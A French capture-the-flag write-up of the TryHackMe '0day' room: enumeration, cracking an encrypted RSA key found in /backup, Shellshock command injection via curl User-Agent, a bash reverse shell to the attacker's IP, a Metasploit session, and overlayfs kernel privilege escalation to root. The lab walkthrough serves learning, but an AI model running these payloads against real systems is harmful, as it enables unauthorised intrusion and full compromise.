# 0day THM
Room de 0Day "Ryan Montgomery", on va test ca !
C'est parti

# Enum
On commence par l'enumération
## Nmap
```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 08:39 EDT
Nmap scan report for 10.10.189.81
Host is up (0.036s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.00 seconds
```
## Gobuster
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin              (Status: 301) [Size: 313] [--> http://10.10.189.81/cgi-bin/]
/img                  (Status: 301) [Size: 309] [--> http://10.10.189.81/img/]
/uploads              (Status: 301) [Size: 313] [--> http://10.10.189.81/uploads/]
/admin                (Status: 301) [Size: 311] [--> http://10.10.189.81/admin/]
/css                  (Status: 301) [Size: 309] [--> http://10.10.189.81/css/]
/js                   (Status: 301) [Size: 308] [--> http://10.10.189.81/js/]
/backup               (Status: 301) [Size: 312] [--> http://10.10.189.81/backup/]
/secret               (Status: 301) [Size: 312] [--> http://10.10.189.81/secret/]
/server-status        (Status: 403) [Size: 292]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
### Page admin / uploads
Page blanche.
### Page secret
Image de tortue très choupette !
### Backup
Contient une clé RSA
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```
On va crack cette clé avec John, d'abord, on va créer le fichier lisible par john :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/0day]
└─$ ssh2john id_rsa > hash.txt        
```
Ensuite, on le crack avec rockyou.txt:
```                                                                                                                                                                                           
┌──(kali㉿kali)-[~/Challenge/TryHackMe/0day]
└─$ john --wordlist=/home/kali/Wordlist/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (id_rsa)     
1g 0:00:00:00 DONE (2023-10-09 09:35) 50.00g/s 25600p/s 25600c/s 25600C/s teiubesc..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
J'ai donc le mdp de cette clé : letmein

## Nikto
Après un bon moment à me casser les dents sur une connexion SSH, je suis retourner sur le site, afin de trouver une potentielle autre prise. Je vais test un scan avec Nikto.
```
┌──(kali㉿kali)-[~]
└─$ nikto -h 10.10.189.81                     
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.189.81
+ Target Hostname:    10.10.189.81
+ Target Port:        80
+ Start Time:         2023-10-09 10:41:40 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/index.html: Admin login page/section found.
+ 8881 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2023-10-09 10:47:05 (GMT-4) (325 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
Il trouve un moyen d'injecter des commandes via la vulnérabilité Shellshock
```
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
```
on va test :
```
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://10.10.189.81/cgi-bin/test.cgi
```
On a bien un résultat !
```
┌──(kali㉿kali)-[~]
└─$ curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://10.10.189.81/cgi-bin/test.cgi     

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
On va pouvoir avoir un revshell 

# Revshell
On va donc essaye d'avoir un revshell en exploitant Shellshock
```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/MON-IP 4444 0>&1' http://10.10.189.81/cgi-bin/test.cgi  
```
Il existe aussi un module metasploit qui permet l'exploitation de shellshock très facilement.
```
multi/http/apache_mod_cgi_bash_env_exec
```
Et nous voila avec un revshell :
```
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.10.189.81
RHOSTS => 10.10.189.81
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.cgi
TARGETURI => /cgi-bin/test.cgi
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST tun0
LHOST => MON-IP
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
[+] 10.10.189.81:80 - The target is vulnerable.
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on MON-IP:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1017704 bytes) to 10.10.189.81
[*] Meterpreter session 1 opened (MON-IP:4444 -> 10.10.189.81:48485) at 2023-10-09 10:52:34 -0400

meterpreter > shell
Process 1190 created.
Channel 1 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Le 1er flag ce trouve dans le /home

# Privesc to ROOT !
En faisant les tests basiques, je constate que la version de linux est vraiment vielle : 
```
Linux version 3.13.0-32-generic
```
En recherchant sur exploit-db.com je trouve un exploit "overlayfs local root in ubuntu"
Je récupère donc les sources et je les télécharges ensuite sur le serveur. Vous allez me demander pourquoi, et vous faites bien !

Quand je compile sur ma kali, je ne peux pas executer le fichier sur le serveur car il va manquer des libs. Quand je le compile sur le serveur, tout fonctionne correctement.
Les librairies ne sont pas au même endroit sur ma kali. 

```
wget MON-IP/37292.c
```
Puis je le compile :
```
gcc 37292.c -o ofs
```
ensuite, plus qu'a l'executer :
```
/ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```
Le flag ce trouve dans ***/root/root.txt***
